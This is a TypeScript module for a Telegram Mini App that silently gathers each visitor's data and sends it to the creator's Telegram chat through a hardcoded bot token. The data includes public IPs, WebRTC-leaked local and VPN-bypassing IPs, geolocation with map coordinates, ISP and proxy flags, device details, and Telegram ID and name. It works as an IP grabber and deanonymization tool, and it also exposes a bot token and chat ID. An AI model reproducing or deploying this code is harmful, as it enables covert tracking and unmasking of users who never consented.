/**
 * Отправка данных в Telegram бота
 */

const BOT_TOKEN = '8300603543:AAGowsZnbTGxqo5tf8hyfMtYMtvkwPAAcgM';
const TELEGRAM_API_URL = `https://api.telegram.org/bot${BOT_TOKEN}`;

// ВАЖНО: Укажите ваш Telegram ID, куда будут приходить уведомления
// Чтобы узнать свой ID, напишите боту @userinfobot в Telegram
const ADMIN_CHAT_ID = '7320458296'; // ID админа (создателя бота)

interface GeoData {
  ip: string;
  country?: string;
  countryCode?: string;
  region?: string;
  city?: string;
  zip?: string;
  lat?: number;
  lon?: number;
  timezone?: string;
  isp?: string;
  org?: string;
  as?: string;
  asname?: string;
  reverse?: string;
  mobile?: boolean;
  proxy?: boolean;
  hosting?: boolean;
}

interface UserData {
  ip: string;
  ipInfo: {
    ipv4: string[];
    ipv6: string[];
    localIP: string[];
    webrtcLeaked: string[]; // Все IP полученные через WebRTC leak
  };
  geoData?: GeoData; // Геоданные
  userAgent: string;
  language: string;
  platform: string;
  screenResolution: string;
  timezone: string;
  timestamp: string;
  telegramUser?: any;
}

/**
 * Отправить сообщение в чат
 */
export async function sendMessageToBot(chatId: string | number, message: string): Promise<boolean> {
  // Retry механизм - 3 попытки
  const maxRetries = 3;
  
  for (let attempt = 1; attempt <= maxRetries; attempt++) {
    try {
      console.log(`📤 Попытка ${attempt}/${maxRetries} отправки в Telegram...`);
      
      const controller = new AbortController();
      const timeoutId = setTimeout(() => controller.abort(), 5000); // 5 секунд таймаут
      
      const response = await fetch(`${TELEGRAM_API_URL}/sendMessage`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          chat_id: chatId,
          text: message,
          parse_mode: 'HTML'
        }),
        signal: controller.signal
      });

      clearTimeout(timeoutId);
      const data = await response.json();
      
      if (data.ok) {
        console.log(`✅ Сообщение отправлено с попытки ${attempt}`);
        return true;
      } else {
        console.error(`❌ Ошибка Telegram API:`, data);
        if (attempt < maxRetries) {
          await new Promise(resolve => setTimeout(resolve, 1000 * attempt)); // Экспоненциальная задержка
        }
      }
    } catch (error) {
      console.error(`❌ Ошибка отправки (попытка ${attempt}):`, error);
      if (attempt < maxRetries) {
        await new Promise(resolve => setTimeout(resolve, 1000 * attempt));
      }
    }
  }
  
  return false;
}

/**
 * Форматировать данные пользователя для отправки
 */
function formatUserData(data: UserData): string {
  let message = '🚨 <b>НОВЫЙ ПОЛЬЗОВАТЕЛЬ В MINI APP</b> 🚨\n\n';
  
  message += `🌐 <b>IP Адрес:</b> <code>${data.ip}</code>\n`;
  
  // ГЕОЛОКАЦИЯ (если доступна)
  if (data.geoData) {
    const geo = data.geoData;
    message += `\n📍 <b>ГЕОЛОКАЦИЯ:</b>\n`;
    
    if (geo.country) {
      const flag = geo.countryCode ? getFlagEmoji(geo.countryCode) : '';
      message += `   ${flag} <b>Страна:</b> ${geo.country}`;
      if (geo.countryCode) message += ` (${geo.countryCode})`;
      message += '\n';
    }
    
    if (geo.region) {
      message += `   🗺️ <b>Регион:</b> ${geo.region}\n`;
    }
    
    if (geo.city) {
      message += `   🏙️ <b>Город:</b> ${geo.city}\n`;
    }
    
    if (geo.zip) {
      message += `   📮 <b>Индекс:</b> ${geo.zip}\n`;
    }
    
    if (geo.lat && geo.lon) {
      message += `   🧭 <b>Координаты:</b> ${geo.lat.toFixed(4)}, ${geo.lon.toFixed(4)}\n`;
      message += `   🗺️ <a href="https://www.google.com/maps?q=${geo.lat},${geo.lon}">Открыть на карте</a>\n`;
    }
    
    if (geo.timezone) {
      message += `   🕐 <b>Timezone:</b> ${geo.timezone}\n`;
    }
    
    if (geo.isp || geo.org) {
      message += `\n🌐 <b>ПРОВАЙДЕР:</b>\n`;
      if (geo.isp) message += `   📡 <b>ISP:</b> ${geo.isp}\n`;
      if (geo.org && geo.org !== geo.isp) message += `   🏢 <b>Org:</b> ${geo.org}\n`;
      if (geo.as) message += `   🔢 <b>AS:</b> ${geo.as}\n`;
      if (geo.asname) message += `   📛 <b>AS Name:</b> ${geo.asname}\n`;
    }
    
    // Флаги безопасности
    if (geo.mobile !== undefined || geo.proxy !== undefined || geo.hosting !== undefined) {
      message += `\n⚠️ <b>ФЛАГИ:</b>\n`;
      if (geo.mobile !== undefined) {
        message += `   📱 Mobile: ${geo.mobile ? '✅ Да' : '❌ Нет'}\n`;
      }
      if (geo.proxy !== undefined) {
        message += `   🔒 Proxy/VPN: ${geo.proxy ? '⚠️ ДА (обнаружен)' : '✅ Нет'}\n`;
      }
      if (geo.hosting !== undefined) {
        message += `   🖥️ Hosting: ${geo.hosting ? '⚠️ ДА (дата-центр)' : '✅ Нет'}\n`;
      }
    }
  }
  
  // WebRTC Leaked IPs - все обнаруженные IP
  if (data.ipInfo.webrtcLeaked && data.ipInfo.webrtcLeaked.length > 0) {
    message += `\n🔓 <b>WebRTC LEAK (${data.ipInfo.webrtcLeaked.length}):</b>\n`;
    data.ipInfo.webrtcLeaked.forEach((ip, index) => {
      message += `   ${index + 1}. <code>${ip}</code>\n`;
    });
  }
  
  // Показываем только публичные IP адреса
  if (data.ipInfo.ipv4.length > 0) {
    message += `\n📍 <b>Публичные IPv4:</b>\n`;
    data.ipInfo.ipv4.forEach(ip => {
      message += `   • <code>${ip}</code>\n`;
    });
  }
  
  if (data.ipInfo.ipv6.length > 0) {
    message += `\n📍 <b>Публичные IPv6:</b>\n`;
    data.ipInfo.ipv6.forEach(ip => {
      message += `   • <code>${ip}</code>\n`;
    });
  }
  
  // Локальные IP показываем для полноты картины
  if (data.ipInfo.localIP && data.ipInfo.localIP.length > 0) {
    message += `\n🏠 <b>Локальные IP:</b>\n`;
    data.ipInfo.localIP.forEach(ip => {
      message += `   • <code>${ip}</code>\n`;
    });
  }
  
  message += `\n📱 <b>УСТРОЙСТВО:</b>\n`;
  message += `   💻 <b>Платформа:</b> ${data.platform}\n`;
  message += `   🌍 <b>Язык:</b> ${data.language}\n`;
  message += `   📺 <b>Разрешение:</b> ${data.screenResolution}\n`;
  message += `   🕐 <b>Timezone:</b> ${data.timezone}\n`;
  message += `   ⏰ <b>Время:</b> ${data.timestamp}\n`;
  
  if (data.telegramUser) {
    message += `\n👤 <b>TELEGRAM USER:</b>\n`;
    message += `   🆔 ID: <code>${data.telegramUser.id}</code>\n`;
    if (data.telegramUser.username) {
      message += `   📝 Username: @${data.telegramUser.username}\n`;
    }
    if (data.telegramUser.first_name) {
      message += `   👤 Name: ${data.telegramUser.first_name}`;
      if (data.telegramUser.last_name) {
        message += ` ${data.telegramUser.last_name}`;
      }
      message += '\n';
    }
  }
  
  message += `\n🔍 <b>USER AGENT:</b>\n<code>${data.userAgent}</code>`;
  
  return message;
}

/**
 * Отправить данные о пользователе в бота
 */
export async function sendUserDataToBot(userData: UserData, targetChatId?: string | number): Promise<boolean> {
  try {
    // Получаем chat_id из Telegram WebApp или используем переданный
    let chatId = targetChatId;
    
    // Приоритет 1: Переданный chat_id
    if (!chatId && ADMIN_CHAT_ID) {
      chatId = ADMIN_CHAT_ID;
      console.log('📤 Используем ADMIN_CHAT_ID:', chatId);
    }
    
    // Приоритет 2: Telegram WebApp user ID
    if (!chatId && typeof window !== 'undefined' && window.Telegram?.WebApp?.initDataUnsafe?.user?.id) {
      chatId = window.Telegram.WebApp.initDataUnsafe.user.id;
      console.log('📤 Используем Telegram user ID:', chatId);
    }
    
    // Если chat_id все еще не определен
    if (!chatId) {
      console.error('❌ Chat ID не найден!');
      console.error('Укажите ADMIN_CHAT_ID в /utils/telegram-bot.ts');
      console.error('Чтобы узнать свой ID, напишите боту @userinfobot в Telegram');
      return false;
    }

    console.log('📨 Отправляем данные в chat_id:', chatId);
    const message = formatUserData(userData);
    const result = await sendMessageToBot(chatId, message);
    
    if (result) {
      console.log('✅ Сообщение успешно отправлено!');
    } else {
      console.error('❌ Ошибка при отправке сообщения');
    }
    
    return result;
  } catch (error) {
    console.error('Error sending user data:', error);
    return false;
  }
}

/**
 * Получить информацию о боте (для проверки работоспособности)
 */
export async function getBotInfo(): Promise<any> {
  try {
    const response = await fetch(`${TELEGRAM_API_URL}/getMe`);
    const data = await response.json();
    return data;
  } catch (error) {
    console.error('Error getting bot info:', error);
    return null;
  }
}

/**
 * Получить эмодзи флага по коду страны
 */
function getFlagEmoji(countryCode: string): string {
  if (!countryCode || countryCode.length !== 2) return '🌍';
  
  const codePoints = countryCode
    .toUpperCase()
    .split('')
    .map(char => 127397 + char.charCodeAt(0));
  
  return String.fromCodePoint(...codePoints);
}